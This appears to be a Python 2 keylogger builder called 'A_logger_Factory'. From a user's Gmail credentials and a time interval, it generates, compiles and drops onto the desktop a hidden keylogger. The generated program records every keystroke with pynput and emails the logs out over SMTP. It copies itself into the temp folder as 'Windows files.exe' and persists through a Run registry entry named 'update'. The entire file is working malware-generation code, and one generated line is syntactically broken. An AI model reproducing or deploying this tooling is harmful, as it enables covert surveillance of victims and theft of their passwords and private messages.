import os,shutil

welcome='''
#########################################################
###############                             #############
############### Welcome to A_logger_Factory #############
################      BY:Ali A.Falih      ###############
#####################                ####################
#########################################################
Help:
*A_logger name -> the name of the A_logger.
*Email -> enter the email that you want to receive
          A_logger reports on.
**** Use a G-mail only.
**** You should activate ((less secure apps)) option in
     the account settings

*Password -> enter the password of the email.

*Time_interval -> the time required before sending the 
                  report (in sec).
*Mode:
      1 -> one file without admin privileges.
      2 -> more than one file with admin privileges.
          
'''
print (welcome)
name=str(raw_input('A_logger name : '))
email=str(raw_input('Email : '))
password=str(raw_input('Password : '))
time=str(raw_input('Time_interval : '))
mode=int(raw_input('Mode : '))
klogcode1="import pynput,threading,smtplib,tempfile,os,sys,subprocess,shutil"
klogcode2='''
def startup():
    klogger_loc=tempfile.gettempdir()
    klogger_loc+="\Windows files.exe"
    if not os.path.exists(klogger_loc):
        shutil.copyfile(sys.executable,klogger_loc)
        subprocess.call(,shell=True)
'''
klogcode7="\nname="+"'"+name+"'"
klogcode6='''
def startup():
    klogger_loc=tempfile.gettempdir()
    klogger_loc+="\\\\"
    if not os.path.exists(klogger_loc+name):
        cwdd=sys.executable
        cwddd=cwdd.replace('\\\\'+name+'.exe','')
        shutil.copytree(cwddd,klogger_loc+name, symlinks=False, ignore=None)
        klogger_loc+=name+'.exe'
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\currentVersion\Run /v update /t REG_SZ /d "'+klogger_loc+'"',shell=True)

'''
klogcode3='''

key_string='\\n\\n'
def send_email(email,password,msg):
    server=smtplib.SMTP('smtp.gmail.com',587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,msg)
    server.quit()
def key_process(key):
    global key_string
    try:
        if (str(key) == 'Key.space'):
            key_string += ' '
        elif (str(key) == 'Key.enter'):
            key_string += " Key.enter "
        elif (str(key) == 'Key.backspace'):
            key_string += " Key.backspace "
        elif (str(key) == 'Key.ctrl_l'):
            key_string += " Key.ctrl_l "
        elif (str(key) == 'Key.ctrl_r'):
            key_string += " Key.ctrl_r "
        elif (str(key) == 'Key.shift'):
            key_string += " Key.shift "
        elif (str(key) == 'Key.caps_lock'):
            key_string += " Key.caps_lock "
        elif (str(key) == 'Key.tab'):
            key_string += " Key.tab "
        elif (str(key) == 'Key.alt_l'):
            key_string += " Key.alt_l "
        elif (str(key) == 'Key.alt_r'):
            key_string += " Key.alt_r "
        elif (str(key) == 'Key.tab'):
            key_string += " Key.tab "
        elif (str(key) == 'Key.f1'):
            key_string += " Key.f1 "
        elif (str(key) == 'Key.f2'):
            key_string += " Key.f2 "
        elif (str(key) == 'Key.f3'):
            key_string += " Key.f3 "
        elif (str(key) == 'Key.f4'):
            key_string += " Key.f4 "
        elif (str(key) == 'Key.f5'):
            key_string += " Key.f5 "
        elif (str(key) == 'Key.f6'):
            key_string += " Key.f6 "
        elif (str(key) == 'Key.f7'):
            key_string += " Key.f7 "
        elif (str(key) == 'Key.f8'):
            key_string += " Key.f8 "
        elif (str(key) == 'Key.f9'):
            key_string += " Key.f9 "
        elif (str(key) == 'Key.f10'):
            key_string += " Key.f10 "
        elif (str(key) == 'Key.f11'):
            key_string += " Key.f11 "
        elif (str(key) == 'Key.f12'):
            key_string += " Key.f12 "
        else:
            key_string += str(key.char)



    except:
        pass

def report():
    global key_string
    x=0
    y=x
    if (key_string !=""):
        temp_path = tempfile.gettempdir()
        print(temp_path)
        os.chdir(temp_path)
        try:
            msg=""
            with open('oflinelogger.txt','r+') as ol_file:
                msg=ol_file.read()
                msg+=key_string
            send_email('''+"'"+email+"'"+''','''+"'"+password+"'"+''',msg)
        except:
            x+=1
            with open('oflinelogger.txt','a') as ol_file:
                ol_file.write(key_string)
        if (x==y):
            olf_path=temp_path+"\oflinelogger.txt"
            os.remove(olf_path)

    key_string = ""
    timer=threading.Timer('''+time+''',report)
    timer.start()
'''
klogcode4='''
startup()
'''
klogcode5='''
key_listener=pynput.keyboard.Listener(on_press=key_process)
with key_listener:
    report()
    key_listener.join()'''
os.chdir('C:\Program Files (x86)\A_logger_Factory')
os.mkdir('pycode')
os.chdir('C:\Program Files (x86)\A_logger_Factory\pycode')

with open(name+'.py','w') as cofile:
    if mode==1:
        cofile.write(klogcode1+klogcode2+klogcode3+klogcode4+klogcode5)
    elif mode==2:
        cofile.write(klogcode1+klogcode7+klogcode6+klogcode3+klogcode4+klogcode5)
    cofile.close()

shutil.copy('C:\Program Files (x86)\A_logger_Factory\icon\ilogger.ico', 'C:\Program Files (x86)\A_logger_Factory\pycode\ilogger.ico')
if mode==1:
    os.system('c:\Python27\Scripts\pyinstaller.exe '+name+'.py --onefile --noconsole --icon ilogger.ico')
    os.chdir('C:\Program Files (x86)\A_logger_Factory\pycode\dist')
    nn=''
    nn=name+'.exe'
    dpath=os.path.expanduser("~/Desktop")
    shutil.move(nn,dpath )
elif mode==2:
    os.system('c:\Python27\Scripts\pyinstaller.exe ' + name + '.py --noconsole --uac-admin --icon ilogger.ico')
    os.chdir('C:\Program Files (x86)\A_logger_Factory\pycode\dist')
    shutil.move(name, os.path.expanduser("~/Desktop"))
os.chdir('C:\Program Files (x86)')
shutil.rmtree('C:\Program Files (x86)\A_logger_Factory\pycode')
print('\n\nDone...\n\n')
print(name+' is on the desktop.\n\n')
quit=0
quit=raw_input('press enter to quit....')



